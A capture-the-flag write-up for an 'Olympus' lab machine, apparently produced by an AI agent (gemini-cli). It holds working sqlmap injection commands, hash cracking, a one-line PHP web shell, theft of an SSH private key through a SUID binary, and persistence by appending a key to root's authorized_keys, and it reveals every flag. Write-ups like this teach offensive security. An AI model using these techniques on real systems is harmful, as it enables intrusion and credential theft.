# Olympus CTF Writeup
*(solved by gemini-cli 🤖🤖🤖)*
## Table of Contents
1. [Enumeration](#enumeration)
2. [Initial Access: Web Exploitation](#initial-access-web-exploitation)
3. [Lateral Movement: Chat Application](#lateral-movement-chat-application)
4. [Privilege Escalation: User (zeus)](#privilege-escalation-user-zeus)
5. [Privilege Escalation: Root](#privilege-escalation-root)
6. [Bonus Flag](#bonus-flag)

---

## Enumeration

The engagement started with an Nmap scan against the target IP address `10.49.128.91`.

```bash
nmap -p- --min-rate 5000 -T4 -Pn 10.49.128.91
nmap -p 22,80 -sV -sC 10.49.128.91
```

**Open Ports:**
- **22/tcp (SSH):** OpenSSH 8.2p1 Ubuntu
- **80/tcp (HTTP):** Apache 2.4.41 (Ubuntu)

Browsing to `http://10.49.128.91/` revealed a 302 redirect to `http://olympus.thm`. I added this hostname to the `/etc/hosts` file.

The main page at `olympus.thm` displayed a message indicating "Olympus v2" was under development and mentioned that "The old version of the website is still accessible on this domain."

Directory enumeration using `ffuf` revealed several interesting directories:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.49.128.91/FUZZ -H "Host: olympus.thm" -mc 200,204,301,302,307,401,403,500 -t 50
```

One of the discoveries was `~webmaster`, which hosted an instance of "Simple Content Management System" by Victor Alagwu (October 2016).

## Initial Access: Web Exploitation

Searching `searchsploit` for "Victor CMS" yielded several known vulnerabilities, including multiple SQL injections.

```bash
searchsploit Victor
```

I used `sqlmap` to test the `search` parameter on `search.php` within the `~webmaster` directory. The parameter proved to be vulnerable to several types of SQL injection (Boolean-based blind, Error-based, Time-based blind, and UNION query).

```bash
sqlmap -u "http://10.49.128.91/~webmaster/search.php" --headers="Host: olympus.thm" --data="search=1337*&submit=" --dbs --batch
```

**Database Dump (`olympus`):**
Using `sqlmap`, I enumerated the tables in the `olympus` database and found: `categories`, `chats`, `comments`, `flag`, `posts`, and `users`.

1. **Flag Table:** Dumping the `flag` table yielded the first flag.
   ```bash
   sqlmap -u "http://10.49.128.91/~webmaster/search.php" --headers="Host: olympus.thm" --data="search=1337*&submit=" -D olympus -T flag --dump --batch
   ```
   **Flag 1:** `flag{Sm4rt!_k33P_d1gGIng}`

2. **Users Table:** Dumping the `users` table provided usernames and bcrypt password hashes.
   - `prometheus`: `$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C`
   - `root`: `$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK`
   - `zeus`: `$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC`
   - *Note: These specific hashes did not crack easily with rockyou.*

3. **Chats Table:** The `chats` table contained interesting conversation logs between `prometheus` and `zeus`.
   - `prometheus`: Attached : prometheus_password.txt (Filename: `47c3210d51761686f3af40a875eeaaea.txt`)
   - `prometheus`: "This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back..."
   - `zeus`: "I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it."

4. **Posts Table:** The `posts` table contained an article from `root` reminding users not to use passwords from the "forbidden password" wordlist. This hinted that a password was likely crackable.

5. **Subdomain Discovery:** The emails in the `users` table (`root@chat.olympus.thm`, `zeus@chat.olympus.thm`) revealed a new subdomain: `chat.olympus.thm`. I added this to `/etc/hosts` as well.

## Lateral Movement: Chat Application

Browsing to `chat.olympus.thm` presented a login page.

While investigating the SQL dump further, specifically the Joomla instance tables that were also dumped (`ouaze_users`), I found another hash for `prometheus`.
- `prometheus`: `$2y$10$wRbKeN6jYGdV4TQHaihSXuK398rCi2iB9JSrGBpP2m44mna1fcMIa`

Running this hash through John the Ripper with the `rockyou.txt` wordlist successfully cracked it.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
**Cracked Password:** `summertime`

I used these credentials (`prometheus` / `summertime`) to log into `chat.olympus.thm`.

Inside the chat application, there was a file upload feature. Knowing from the chat logs that uploaded files are renamed randomly (MD5 hash), I created a simple PHP web shell.

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

I uploaded this `shell.php`. To find its new, randomized filename, I used the existing SQL injection vulnerability on `olympus.thm/~webmaster/search.php` to dump the `chats` table again. The new entry revealed the uploaded file's name: `61b3fa41bc01eb7e91253abcd77e4be5.php`.

Navigating to `http://chat.olympus.thm/uploads/61b3fa41bc01eb7e91253abcd77e4be5.php?cmd=id` confirmed remote code execution as the `www-data` user.

## Privilege Escalation: User (zeus)

With a web shell established, I began enumerating the system.

Checking for SUID binaries revealed an unusual custom binary:
```bash
find / -perm -4000 -type f 2>/dev/null
```
- `/usr/bin/cputils`

Running `/usr/bin/cputils -h` showed it was a utility to copy a source file to a target file. Because it possessed the SUID bit, it ran with root privileges.

I leveraged `/usr/bin/cputils` to copy the SSH private key of the user `zeus` (`/home/zeus/.ssh/id_rsa`) to a readable location (`/tmp/id_rsa`).

```bash
# Executed via the webshell:
printf '/home/zeus/.ssh/id_rsa\n/tmp/id_rsa\n' | /usr/bin/cputils
cat /tmp/id_rsa
```

I copied the key locally, fixed its permissions (`chmod 600 zeus_id_rsa`), and used it to SSH into the machine as `zeus`.

```bash
ssh -i zeus_id_rsa zeus@10.49.128.91
```

Once logged in as `zeus`, I retrieved the user flag from `/home/zeus/user.flag`.
**Flag 2:** `flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}`

## Privilege Escalation: Root

In `/home/zeus`, there was a file `zeus.txt` left by `prometheus`, stating he had hacked his way back in and established a permanent root backdoor.

While previously exploring the web directories as `www-data`, I noticed a secret directory: `/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc`.

Investigating this directory as `zeus` revealed a PHP file named `VIGQFQFMYOST.php`. Analyzing its source code exposed that it was a web interface for a "snodew reverse root shell backdoor".

The PHP script executed a hardcoded binary: `/lib/defended/libc.so.99`.

I checked the permissions of this binary and found it was an SUID root executable.

```bash
ls -la /lib/defended/libc.so.99
# Output: -rwsr-xr-x 1 root root 16784 Apr 14  2022 /lib/defended/libc.so.99
```

I verified that I could pipe commands into this binary to execute them as root:
```bash
echo id | /lib/defended/libc.so.99
# Output: uid=0(root) gid=0(root) groups=0(root)...
```

To establish a proper, persistent root shell, I generated a new SSH key pair locally, uploaded the public key, and used the SUID backdoor to append it to `/root/.ssh/authorized_keys`.

```bash
# Locally:
ssh-keygen -t rsa -f my_key

# Uploading and appending via zeus SSH session:
PUBKEY=$(cat my_key.pub)
echo "mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo '$PUBKEY' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys" | /lib/defended/libc.so.99
```

I then logged in seamlessly as root.
```bash
ssh -i my_key root@10.49.128.91
```

I read the root flag located at `/root/root.flag`.
**Flag 3:** `flag{D4mN!_Y0u_G0t_m3_:)_}`

## Bonus Flag

The `root.flag` file contained a postscript message:
> PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)
> (Hint : regex can be usefull)

With my newly acquired root SSH access, I used `grep` to search the entire filesystem for strings matching the flag format `flag{...}`.

```bash
grep -rnE 'flag{[^}]+}' /etc /root /var/backups /var/log /opt /home 2>/dev/null
```

This search successfully located a hidden file `/etc/ssl/private/.b0nus.fl4g` containing the final flag.

**Flag 4:** `flag{Y0u_G0t_m3_g00d!}`
